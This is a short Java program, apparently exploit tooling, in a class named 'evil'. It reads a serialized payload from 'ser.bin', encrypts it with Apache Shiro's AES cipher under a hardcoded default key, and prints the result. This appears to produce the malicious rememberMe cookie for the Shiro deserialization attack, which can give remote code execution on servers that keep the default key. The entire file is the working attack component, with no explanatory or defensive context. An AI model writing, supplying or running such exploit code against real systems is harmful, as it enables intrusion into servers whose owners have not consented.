package shiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.nio.file.FileSystems;
import java.nio.file.Files;

public class evil {
    public static void main(String []args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("ser.bin"));
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
